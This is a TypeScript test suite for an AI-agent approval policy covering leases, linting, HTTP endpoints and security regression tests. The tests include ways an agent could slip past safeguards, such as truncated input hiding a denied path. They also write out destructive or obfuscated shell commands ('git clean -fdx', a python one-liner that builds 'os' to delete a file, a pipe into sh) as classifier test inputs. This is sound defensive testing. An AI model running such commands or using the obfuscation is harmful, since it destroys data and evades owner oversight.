  assert.deepEqual(c.control.snapshot().policy!.fm.rules.filter((r) => r.id.startsWith("lease-")), [], "and nothing is left behind");
  assert.equal(c.store.getAgent("codex")!.tools.drive, false);
});

test("AC2: a lease for one goal ends when the goal ends (done, failed or stopped), or at its time, whichever is first", async (t) => {
  for (const ending of ["done", "failed"] as const) {
    const c = await mk(t);
    const goal = runningGoal(c);
    const task = runningTask(c, goal);
    const g = await c.policy.grant({ agentId: "claude", tool: "drive", goalId: goal.id, action: "write" });
    assert.ok(g.ok, ending);
    if (!g.ok) return;
    assert.equal(g.lease.goalOnly, true);
    assert.equal(g.lease.expiresAt, T0 + 24 * HOUR, "a goal-only lease has a ceiling");
    assert.match(read(c.root, "POLICY.md"), new RegExp(`scope: agent:claude room:general goal:${goal.id}`));

    assert.equal((await ask(c, { taskId: task.id }, "drive", "write", "to #general")).auto, true, "inside the goal");
    const chat = ask(c, {}, "drive", "write", "to #general"); // a request that isn't part of the goal
    assert.equal(await pending(c, chat), true, "outside the goal it still asks");
    await declineAll(c, [chat]);

    c.store.saveGoal({ ...goal, status: ending });
    await c.policy.idle();
    assert.deepEqual(c.policy.leases(), [], ending);
    assert.doesNotMatch(read(c.root, "POLICY.md"), /lease-/);
    assert.ok(auditHas(c, "lease.expired", "its goal ended"), ending);
    const after = ask(c, { taskId: task.id }, "drive", "write", "to #general");
    assert.equal(await pending(c, after), true);
    await declineAll(c, [after]);
  }
  const c = await mk(t);
  const goal = runningGoal(c);
  const g = await c.policy.grant({ agentId: "claude", tool: "drive", goalId: goal.id, minutes: 10, action: "write" });
  assert.ok(g.ok);
  c.clock.t += 11 * MIN; // the goal is still running, the time is up
  assert.equal(c.policy.policyDecision("claude", c.general.id, goal.id, "drive", "write", "x"), "none");
  await c.policy.sweep();
  assert.deepEqual(c.policy.leases(), []);
  assert.ok(auditHas(c, "lease.expired", "its time ran out"));
  // an ended goal can't be leased
  const dead = await c.policy.grant({ agentId: "claude", tool: "drive", goalId: runningGoal(c, c.general.id, "done").id });
  assert.equal(dead.ok, false);
});

test("AC2: leases show in the linter: a live one is quiet, one past its time is flagged", async (t) => {
  const c = await mk(t);
  const live: RuleOut = { id: "lease-aaaa11", effect: "allow", tool: "slack", match: "action:post", scope: "agent:claude", expires: new Date(T0 + 10 * MIN).toISOString(), source: "owner", accepted: true };
  const old: RuleOut = { ...live, id: "lease-bbbb22", expires: new Date(T0 - 5 * MIN).toISOString() };
  write(c.root, "POLICY.md", addRules(read(c.root, "POLICY.md"), [{ rule: live, line: "Live lease", section: "lease" }, { rule: old, line: "Old lease", section: "lease" }], "owner", isoDay(T0)));
  await c.control.load();
  const flags = c.control.lint().flags.filter((f) => f.file === "POLICY.md");
  assert.equal(flags.length, 1);
  assert.match(flags[0].message, /lease "lease-bbbb22" expired at 2026-10-23 17:55 UTC; it no longer applies/);
  assert.ok(c.control.status().lint.flags.some((f) => /lease-bbbb22/.test(f.message)), "and it is in the status the apps show");
  assert.equal(c.policy.policyDecision("claude", c.general.id, undefined, "slack", "post", "x"), "allow", "the live one applies");
  c.clock.t += 20 * MIN;
  assert.ok(c.control.lint().flags.some((f) => /lease-aaaa11" expired/.test(f.message)), "time passing flags it");
  assert.equal(c.policy.policyDecision("claude", c.general.id, undefined, "slack", "post", "x"), "none");
  assert.equal(c.policy.leases().length, 0);
  // the sweep also clears hand-written leases
  assert.deepEqual((await c.policy.sweep()).sort(), ["lease-aaaa11", "lease-bbbb22"]);
  assert.deepEqual(c.control.lint().flags.filter((f) => f.file === "POLICY.md"), []);
});

test("AC2: a lease the owner deletes from POLICY.md is gone at once, and the tool goes back as it was", async (t) => {
  const c = await mk(t);
  const g = await c.policy.grant({ agentId: "codex", tool: "slack", minutes: 30, action: "post" });
  assert.ok(g.ok);
  if (!g.ok) return;
  assert.equal(c.store.getAgent("codex")!.tools.slack, true);
  write(c.root, "POLICY.md", removeRules(read(c.root, "POLICY.md"), [g.lease.id], "owner", isoDay(T0)));
  await c.control.load();
  await c.control.idle();
  assert.deepEqual(c.policy.leases(), []);
  assert.equal(c.store.getAgent("codex")!.tools.slack, false);
  assert.ok(auditHas(c, "lease.revoked", g.lease.id));
});

test("AC2: approval-card buttons make the right lease: 'Allow for 30 minutes' and 'Allow for this goal' approve the request too", async (t) => {
  const c = await boot(t);
  const goal = runningGoal(c);
  const task = runningTask(c, goal);

  // 30 minutes
  const p1 = ask(c, { taskId: task.id }, "drive", "write", "to #general: hello");
  assert.equal(await pending(c, p1), true);
  const card1 = c.store.listApprovals("pending")[0];
  const r1 = await api(c, "POST", `/approvals/${card1.id}/lease`, { minutes: 30 });
  assert.equal(r1.status, 201, JSON.stringify(r1.body));
  assert.equal((await p1).status, "approved", "the request that was waiting goes ahead");
  assert.equal(r1.body.approval.status, "approved");
  assert.deepEqual([r1.body.lease.agentId, r1.body.lease.tool, r1.body.lease.action, r1.body.lease.goalOnly], ["claude", "drive", "write", false]);
  assert.equal(r1.body.lease.expiresAt, T0 + 30 * MIN);
  assert.equal(r1.body.lease.roomId, c.general.id);
  assert.equal((await ask(c, {}, "drive", "write", "to #general: again")).auto, true);
  assert.equal(c.policy.leases().length, 1);

  // this goal
  await api(c, "DELETE", `/leases/${r1.body.lease.id}`);
  const p2 = ask(c, { taskId: task.id }, "drive", "write", "to #general: hello");
  assert.equal(await pending(c, p2), true);
  const r2 = await api(c, "POST", `/approvals/${c.store.listApprovals("pending")[0].id}/lease`, { forGoal: true });
  assert.equal(r2.status, 201, JSON.stringify(r2.body));
  assert.equal((await p2).status, "approved");
  assert.deepEqual([r2.body.lease.goalId, r2.body.lease.goalOnly, r2.body.lease.action], [goal.id, true, "write"]);
  assert.match(read(c.root, "POLICY.md"), new RegExp(`goal:${goal.id}`));
  assert.equal((await ask(c, { taskId: task.id }, "drive", "write", "to #general")).auto, true);

  // the card needs to say how long; a question or an already-answered card can't be leased; no goal, no goal lease
  const p3 = ask(c, {}, "drive", "write", "to #general");
  assert.equal(await pending(c, p3), true);
  const open = c.store.listApprovals("pending")[0];
  assert.equal((await api(c, "POST", `/approvals/${open.id}/lease`, {})).status, 400);
  c.store.saveGoal({ ...goal, status: "done" }); await c.policy.idle();
  assert.equal((await api(c, "POST", `/approvals/${open.id}/lease`, { forGoal: true })).status, 400, "the goal is over");
  assert.equal((await api(c, "POST", `/approvals/${open.id}/lease`, { minutes: 5 })).status, 201);
  await p3;
  assert.equal((await api(c, "POST", `/approvals/${open.id}/lease`, { minutes: 5 })).status, 409, "already answered");
  assert.equal((await api(c, "POST", `/approvals/nope/lease`, { minutes: 5 })).status, 404);
});

test("AC2: an email-send lease is granted, but the two-key check still owns sends", async (t) => {
  const c = await mk(t);
  const g = await c.policy.grant({ agentId: "claude", tool: "gmail", minutes: 30, action: "send" });
  assert.ok(g.ok);
  if (!g.ok) return;
  assert.match(g.notes.join(" "), /two-key/);
  const p = ask(c, {}, "gmail", "send", JSON.stringify({ to: ["a@b.com"] }));
  assert.equal(await pending(c, p), true);
  await declineAll(c, [p]);
  const draft = await c.policy.grant({ agentId: "claude", tool: "gmail", minutes: 30, action: "draft" });
  assert.ok(draft.ok);
  // A draft is not a send: the owner's lease skips Claude's asks-first for it (a ROOM.md ask would still win; see M5)
  assert.equal((await ask(c, {}, "gmail", "draft", JSON.stringify({ to: ["a@b.com"] }))).auto, true);
});

// ---------------------------------------------------------------- HTTP

test("HTTP: GET /policy groups rules by source with plain lines; accept, edit and delete work from the apps; leases can be granted and revoked", async (t) => {
  const c = await boot(t);
  answered(c, 5, "approved", driveRead);
  assert.equal((await api(c, "POST", "/policy/learn")).body.proposed.length, 1);
  await ownerRules(c, [{ tool: "shell", match: "action:run cmd:git push", effect: "ask", scope: "*" }]);

  const s = (await api(c, "GET", "/policy")).body;
  assert.equal(s.ok, true); assert.equal(s.pending, 1);
  assert.match(s.path, /POLICY\.md$/);
  const learned = s.rules.find((r: any) => r.kind === "learned");
  assert.equal(learned.text, "Allow Claude's Drive reads in /Board: you approved 5 of 5 since Oct 23.");
  assert.equal(learned.agentId, "claude");
  assert.ok(s.rules.some((r: any) => r.kind === "owner" && r.tool === "shell" && r.effect === "ask"));

  assert.equal((await api(c, "POST", "/policy/rules/nope/accept")).status, 404);
  assert.equal((await api(c, "PATCH", `/policy/rules/${learned.id}`, { match: "garbage" })).status, 400);
  assert.equal((await api(c, "PATCH", `/policy/rules/${learned.id}`, { colour: "red" })).status, 400);
  assert.equal((await api(c, "PATCH", `/policy/rules/${learned.id}`, { expires: "next week" })).status, 400);
  assert.equal((await api(c, "PATCH", `/policy/rules/${learned.id}`, { expires: "2026-12-31" })).status, 200);
  assert.equal((await api(c, "POST", `/policy/rules/${learned.id}/accept`)).status, 200);
  assert.equal((await api(c, "GET", "/policy")).body.pending, 0);
  assert.equal((await ask(c, {}, "drive", "read", "/Board/x.md")).auto, true);
  assert.equal((await api(c, "DELETE", `/policy/rules/${learned.id}`)).status, 200);
  assert.equal((await api(c, "DELETE", `/policy/rules/${learned.id}`)).status, 404);

  // leases
  assert.equal((await api(c, "POST", "/leases", { agentId: "claude", tool: "drive" })).status, 400, "needs a time or a goal");
  assert.equal((await api(c, "POST", "/leases", { agentId: "claude", tool: "drive", minutes: 0 })).status, 400);
  assert.equal((await api(c, "POST", "/leases", { agentId: "ghost", tool: "drive", minutes: 5 })).status, 404);
  assert.equal((await api(c, "POST", "/leases", { agentId: "claude", tool: "nonsense", minutes: 5 })).status, 400);
  assert.equal((await api(c, "POST", "/leases", { agentId: "claude", tool: "drive", minutes: 5, goalId: "nope" })).status, 400);
  const made = await api(c, "POST", "/leases", { agentId: "claude", tool: "drive", minutes: 30, action: "write", roomId: c.board.id });
  assert.equal(made.status, 201, JSON.stringify(made.body));
  assert.match(read(c.root, "POLICY.md"), /scope: agent:claude room:board/);
  const list = (await api(c, "GET", "/leases")).body;
  assert.equal(list.length, 1);
  assert.equal(list[0].remainingMs, 30 * MIN);
  assert.match(list[0].text, /Claude's Drive writes/);
  assert.equal((await ask(c, { roomId: c.board.id }, "drive", "write", "x")).auto, true, "in the room it was granted for");
  const elsewhere = ask(c, { roomId: c.general.id }, "drive", "write", "x");
  assert.equal(await pending(c, elsewhere), true, "and nowhere else");
  await declineAll(c, [elsewhere]);
  const revoke = await api(c, "DELETE", `/leases/${made.body.lease.id}`);
  assert.equal(revoke.status, 200);
  assert.deepEqual((await api(c, "GET", "/leases")).body, []);
  assert.ok(auditHas(c, "lease.revoked", made.body.lease.id));
  assert.equal((await api(c, "DELETE", `/leases/${made.body.lease.id}`)).status, 404);

  // a file the owner broke stops the apps' edits with a clear message, and nothing else
  write(c.root, "POLICY.md", "---\nkind: policy\nschema: 1\nupdated: 2026-10-23\nupdated_by: owner\ndefaults: [oops\n---\n");
  await c.control.load();
  const broken = await api(c, "POST", "/leases", { agentId: "claude", tool: "drive", minutes: 5 });
  assert.equal(broken.status, 409);
  assert.match(broken.body.error, /POLICY\.md has a problem/);
  assert.equal((await api(c, "GET", "/policy")).body.ok, true, "the last good version is still what's shown");
});

// ---------------------------------------------------------------- the apps

test("4.2 apps: the phone and the Mac show the rules, the leases with a Revoke, and the two lease buttons on a plain approval card", () => {
  const web = readFileSync(join(import.meta.dirname, "../web/app.js"), "utf8");
  assert.match(web, /renderPolicy/);
  assert.match(web, /data-nav="policy"/);
  assert.match(web, /Allow for 30 minutes/);
  assert.match(web, /Allow for this goal/);
  assert.match(web, /data-lease-revoke/);
  const mac = join(import.meta.dirname, "../../app/src");
  const screen = readFileSync(join(mac, "screens/PolicyScreen.tsx"), "utf8");
  assert.match(screen, /Revoke/);
  assert.match(screen, /Active leases/);
  const cards = readFileSync(join(mac, "screens/ApprovalsScreen.tsx"), "utf8");
  assert.match(cards, /Allow for 30 minutes/);
  assert.match(cards, /Allow for this goal/);
  const phoneCopy = web.match(/4\.2 approval rules[\s\S]*?\n  \/\/ ---------- 1\.1/)?.[0] ?? "";
  assert.ok(phoneCopy.length > 500 && !phoneCopy.includes("\u2014") && !screen.includes("\u2014"), "no em dashes in the new copy");
});

// ---------------------------------------------------------------- 4.2 security review: regression tests (one per finding)

test("M1: a two-key card cannot be turned into a lease: the owner has to pick a draft, and nothing is granted", async (t) => {
  const c = await boot(t);
  const card: Approval = {
    id: id("apr"), agentId: "claude", roomId: c.general.id, tool: "gmail", action: "mcp__Gmail__send_message", detail: "a disagreement between two drafts",
    status: "pending", createdAt: c.clock.t, twoKey: { kind: "email" } as unknown as Approval["twoKey"],
  };
  c.store.saveApproval(card);
  for (const body of [{ minutes: 30 }, { forGoal: true }]) {
    const r = await api(c, "POST", `/approvals/${card.id}/lease`, body);
    assert.equal(r.status, 400, JSON.stringify(r.body));
    assert.match(String(r.body.error ?? r.body.message), /two-key card needs you to pick a draft/);
  }
  assert.equal(c.store.getApproval(card.id)!.status, "pending", "the card is still waiting for the owner");
  assert.equal(c.policy.leases().length, 0, "and nothing was granted");
  assert.doesNotMatch(read(c.root, "POLICY.md"), /lease-/);
});

test("M2: a rule is read against the tool's whole input, not the cut-short text: a long body can't push the path a deny rule names out of sight", async (t) => {
  const c = await mk(t);
  await ownerRules(c, [{ effect: "deny", tool: "drive", match: "action:write path:/Board/secret", scope: "*" }, { effect: "allow", tool: "drive", match: "action:write", scope: "agent:claude" }]);
  const input = { content: "x".repeat(6000), path: "/Board/secret/plan.md" };
  const whole = JSON.stringify(input);
  const cut = whole.slice(0, 4000); // what request_approval keeps of a tool input
  assert.ok(!cut.includes("secret"));

  // with the input: denied, no card
  const denied = await c.orch.requestApproval({ agentId: "claude", roomId: c.general.id }, "drive", "write", cut, input);
  assert.equal(denied.status, "rejected");
  assert.equal(c.store.listApprovals("pending").length, 0);
  assert.deepEqual(shapeOf("drive", "write", cut, input).paths, ["/Board/secret/plan.md"]);

  // with only the cut text: never auto-approved, and a deny rule that might have been cut away is not skipped over; the owner decides
  assert.equal(shapeOf("drive", "write", cut).truncated, true);
  assert.equal(shapeOf("drive", "write", whole).truncated, undefined, "whole text is read as it is");
  const p = ask(c, {}, "drive", "write", cut);
  assert.equal(await pending(c, p), true, "an allow does not stand for text that was cut");
  await declineAll(c, [p]);
  assert.equal(c.policy.policyDecision("claude", c.general.id, undefined, "drive", "write", cut), "ask");

  // an ordinary request is unaffected: the allow still works for a path the deny doesn't name
  const fine = await c.orch.requestApproval({ agentId: "claude", roomId: c.general.id }, "drive", "write", JSON.stringify({ path: "/Board/notes.md", content: "hi" }), { path: "/Board/notes.md", content: "hi" });
  assert.equal(fine.auto, true);
});

test("M5: an allow rule never overrides an `ask` the owner's files wrote (TOOLS.md or ROOM.md); a lease skips the agent's asks-first but never a ROOM.md ask", async (t) => {
  const c = await mk(t);
  // Claude asks first about Gmail: TOOLS.md says ask. An allow rule or a lease for a draft doesn't skip the card.
  assert.match(read(c.root, "agents/claude/TOOLS.md"), /gmail: ask/);
  await ownerRules(c, [{ tool: "gmail", match: "action:draft", scope: "agent:claude" }]);
  const detail = JSON.stringify({ to: ["amy@atmosphere.tv"], subject: "Hi" });
  assert.equal(c.policy.gate({ agentId: "claude", roomId: c.general.id }, c.store.getAgent("claude"), { agentId: "claude", roomId: c.general.id, tool: "gmail", action: "draft", detail }), undefined, "the policy steps aside");
  const p = ask(c, {}, "gmail", "draft", detail);
  assert.equal(await pending(c, p), true, "an allow rule does not skip the card");
  await declineAll(c, [p]);

  // A lease is the owner's own "don't ask me for this for a while": it skips the agent's asks-first (TOOLS.md), like it may switch a tool on.
  const lease = await c.policy.grant({ agentId: "claude", tool: "gmail", minutes: 30, action: "draft" });
  assert.ok(lease.ok);
  if (lease.ok) assert.doesNotMatch(lease.notes.join(" "), /card will still come/);
  assert.equal((await ask(c, {}, "gmail", "draft", detail)).auto, true, "a lease skips the agent's asks-first");
  // ...but a room whose ROOM.md says ask keeps asking, lease or not
  write(c.root, "rooms/board/ROOM.md", read(c.root, "rooms/board/ROOM.md").replace("tools: {}", "tools:\n  gmail: ask"));
  await c.control.load();
  const boardLease = await c.policy.grant({ agentId: "claude", tool: "gmail", minutes: 30, action: "draft", roomId: c.board.id });
  if (boardLease.ok) assert.match(boardLease.notes.join(" "), /ROOM\.md says to ask/, "the grant says so");
  const q = ask(c, { roomId: c.board.id }, "gmail", "draft", detail);
  assert.equal(await pending(c, q), true, "a ROOM.md ask beats a lease");
  await declineAll(c, [q]);
  write(c.root, "rooms/board/ROOM.md", read(c.root, "rooms/board/ROOM.md").replace("tools:\n  gmail: ask", "tools: {}"));
  await c.control.load();

  // ROOM.md ask in one room: the allow doesn't reach it, and the other room keeps its own rules
  await ownerRules(c, [{ tool: "drive", match: "action:read", scope: "*" }]);
  write(c.root, "rooms/board/ROOM.md", read(c.root, "rooms/board/ROOM.md").replace("tools: {}", "tools:\n  drive: ask"));
  await c.control.load();
  const r = ask(c, { roomId: c.board.id }, "drive", "read", "/Board/a.md");
  assert.equal(await pending(c, r), true);
  await declineAll(c, [r]);
  assert.equal((await ask(c, { roomId: c.general.id }, "drive", "read", "/Board/a.md")).auto, true, "a tool that is only ask by default is still carved out by the owner's allow");
});

test("M6: the learner and the policy use the same two-key class as the check: an unsure shell command and `git clean` are two-key, and no allow is ever learned for them", async (t) => {
  assert.equal(twoKeyClass("shell", "Bash", { command: "git clean -fdx" }), true);
  assert.equal(twoKeyClass("shell", "Bash", { command: "python3 -c \"__import__('o'+'s').remove('x')\"" }), true, "unsure counts");
  assert.equal(twoKeyClass("shell", "Bash", { command: "mv a b" }), true);
  assert.equal(twoKeyClass("drive", "mcp__pipedrive__update_deal"), true);
  assert.equal(twoKeyClass("shell", "Bash", { command: "pnpm test" }), false);
  assert.equal(twoKeyClass("shell", "Bash", JSON.stringify({ command: "git clean -fdx" })), true, "a JSON text is read as the input it is");

  const mk1 = (over: Partial<Approval>): Approval => ({ id: id("apr"), agentId: "claude", tool: "shell", action: "Bash", detail: "", status: "approved", createdAt: T0 - 2000, decidedAt: T0 - 1000, ...over });
  const six = (command: string) => Array.from({ length: 6 }, () => mk1({ detail: JSON.stringify({ command }) }));
  for (const command of ["git clean -fdx", "git --work-tree . clean -fdx", "python3 -c \"print(1)\"", "mv a b", "cat <<< 'x' | sh"]) {
    assert.deepEqual(learn(six(command), T0).filter((p) => p.effect === "allow"), [], `${command}: no allow is learned for a two-key action`);
  }
  assert.ok(learn(six("pnpm test"), T0).some((p) => p.effect === "allow"), "an ordinary command is still learned");

  // and an agent's own "run without asking" never stands in for the two keys: Claude runs shell without asking here, yet `git clean -fdx` is not auto-approved
  const c = await mk(t);
  assert.equal(c.store.getAgent("claude")!.autoApprove?.shell, true);
  assert.equal((await ask(c, {}, "shell", "Bash", JSON.stringify({ command: "ls -la" }))).auto, true, "an ordinary command still runs without asking");
  const input = { command: "git --work-tree . clean -fdx" };
  const p = c.orch.requestApproval({ agentId: "claude", roomId: c.general.id }, "shell", "Bash", JSON.stringify(input), input);
  const first = await Promise.race([p.then((a) => (a.auto ? "auto" : a.status)), new Promise((r) => setTimeout(() => r("waiting"), 400))]);
  assert.notEqual(first, "auto", "a delete the check can't clear is the owner's");
  await declineAll(c, [p]);
});

test("L5: the linter flags an allow rule for every tool and every action, and not a narrower one", async (t) => {
  const c = await mk(t);
  await ownerRules(c, [{ tool: "*", match: "action:*", scope: "agent:claude" }]);
  const flags = c.control.lint().flags.map((f) => f.message);
  assert.ok(flags.some((m) => /tool \* with action:\*/.test(m) && /turns approvals off/.test(m)), flags.join("\n"));
  await ownerRules(c, [{ tool: "drive", match: "action:*", scope: "agent:claude" }]);
  assert.equal(c.control.lint().flags.filter((f) => /tool \* with action:\*/.test(f.message)).length, 1, "only the broad rule is flagged");
});

// ---------------------------------------------------------------- 4.1/4.2 round 3

test("round 3 N9: a lease granted from a room with no folder name (a direct message) stays in that room, one granted from a request with no room applies only to requests with no room, and an API lease with no room is still the agent's in any room", async (t) => {
  const c = await mk(t);
  const dm = c.store.createRoom("dm-claude", { dmAgentId: "claude" });
  assert.equal(c.control.slugFor(dm.id), undefined, "a direct message has no folder name");
  const g = await c.policy.grant({ agentId: "claude", tool: "drive", minutes: 30, action: "write", roomId: dm.id });
  assert.ok(g.ok);
  if (!g.ok) return;
  assert.match(read(c.root, "POLICY.md"), new RegExp(`scope: agent:claude roomid:${dm.id}\\n`), "the room's own id is in the scope");
  assert.deepEqual(c.control.lint().blocks, [], "the scope reads cleanly");
  assert.equal((await ask(c, { roomId: dm.id }, "drive", "write", "to the DM")).auto, true, "it applies in the room it was granted in");
  for (const where of [c.general, c.board]) {
    const p = ask(c, { roomId: where.id }, "drive", "write", "elsewhere");
    assert.equal(await pending(c, p), true, `not in #${where.name}`);
    await declineAll(c, [p]);
  }
  assert.equal(c.policy.evaluate("claude", undefined, undefined, "drive", "write", "x").effect, "none", "nor with no room");
  assert.equal(c.policy.leases()[0].roomId, dm.id);

  // from a request that had no room: only requests with no room
  const n = await c.policy.grant({ agentId: "claude", tool: "slack", minutes: 30, action: "post", noRoom: true });
  assert.ok(n.ok);
  assert.match(read(c.root, "POLICY.md"), /scope: agent:claude noroom\n/);
  assert.equal(c.policy.evaluate("claude", undefined, undefined, "slack", "post", "x").effect, "allow");
  assert.equal(c.policy.evaluate("claude", c.general.id, undefined, "slack", "post", "x").effect, "none", "a request in a room is not covered");
  assert.equal(c.policy.evaluate("claude", dm.id, undefined, "slack", "post", "x").effect, "none");
  assert.equal(c.policy.evaluate("codex", undefined, undefined, "slack", "post", "x").effect, "none", "and only for its own agent");

  // the card's own button does the same: an approval with no room gives a no-room lease
  const p = c.orch.requestApproval({ agentId: "claude" } as Parameters<typeof c.orch.requestApproval>[0], "drive", "write", "no room at all");
  assert.equal(await pending(c, p), true);
  const card = c.store.listApprovals("pending")[0];
  assert.equal(card.roomId, undefined);
  const r = await c.policy.leaseFromApproval(card, { minutes: 30 }, (id) => c.approvals.decide(id, "approved"));
  assert.ok(r.ok, JSON.stringify(r));
  await p;
  assert.equal(c.policy.evaluate("claude", undefined, undefined, "drive", "write", "x").effect, "allow");
  assert.equal(c.policy.evaluate("claude", c.general.id, undefined, "drive", "write", "x").effect, "none");

  // a lease from a named room still has its room name (and now its id too); an API lease with no room at all is the agent's in every room, as before
  const named = await c.policy.grant({ agentId: "claude", tool: "gmail", minutes: 30, action: "draft", roomId: c.board.id });
  assert.ok(named.ok);
  assert.match(read(c.root, "POLICY.md"), new RegExp(`scope: agent:claude room:board roomid:${c.board.id}\\n`));
  assert.equal(c.policy.evaluate("claude", c.board.id, undefined, "gmail", "draft", "x").effect, "allow");
  assert.equal(c.policy.evaluate("claude", c.general.id, undefined, "gmail", "draft", "x").effect, "none");
  const any = await c.policy.grant({ agentId: "claude", tool: "shell", minutes: 30, action: "run" });
  assert.ok(any.ok);
  assert.match(read(c.root, "POLICY.md"), /scope: agent:claude\n(?!.*roomid)/);
  for (const room of [undefined, c.general.id, dm.id, c.board.id]) assert.equal(c.policy.evaluate("claude", room, undefined, "shell", "run", "ls").effect, "allow");
});

test("round 3 N14: a lease that switches a tool on does not apply until the tool is seen to be on for good; when the files keep it off, it never applied", async (t) => {
  const c = await mk(t);
  assert.equal(c.store.getAgent("codex")!.tools.drive ?? false, false);
  const effect = () => c.policy.evaluate("codex", c.general.id, undefined, "drive", "write", "to #general").effect;
  const seen: { effect: string; leases: number; on: boolean }[] = [];
  const idle = c.control.idle.bind(c.control);
  c.control.idle = async () => { seen.push({ effect: effect(), leases: c.policy.leases().length, on: c.store.getAgent("codex")!.tools.drive === true }); await idle(); };
  const g = await c.policy.grant({ agentId: "codex", tool: "drive", minutes: 30, action: "write" });
  assert.ok(g.ok);
  assert.ok(seen.length > 0, "the check that the switch stuck ran");
  for (const s of seen) { assert.equal(s.effect, "none", "while the switch is unconfirmed the lease allows nothing"); assert.equal(s.leases, 0, "and is not listed as active"); }
  assert.equal(effect(), "allow", "once the tool is confirmed on, it applies");
  assert.equal(c.policy.leases().length, 1);
  assert.ok(!c.store.getKV<{ pending?: boolean }[]>("policy_leases", []).some((l) => l.pending), "nothing is left pending");

  // the owner's own deny rule keeps the tool off: the lease never applied at any moment, and nothing is left
  c.clock.t += 31 * MIN;
  await c.policy.sweep();
  await c.control.idle();
  await ownerRules(c, [{ effect: "deny", tool: "drive", match: "*", scope: "agent:codex" }]);
  seen.length = 0;
  const no = await c.policy.grant({ agentId: "codex", tool: "drive", minutes: 30, action: "write" });
  assert.equal(no.ok, false);
  assert.ok(seen.every((s) => s.effect !== "allow"), "never allowed, not even for a moment");
  assert.equal(effect(), "deny");
  assert.deepEqual(c.control.snapshot().policy!.fm.rules.filter((r) => r.id.startsWith("lease-")), []);
  assert.deepEqual(c.store.getKV("policy_leases", []), []);
  assert.equal(c.store.getAgent("codex")!.tools.drive, false);
});
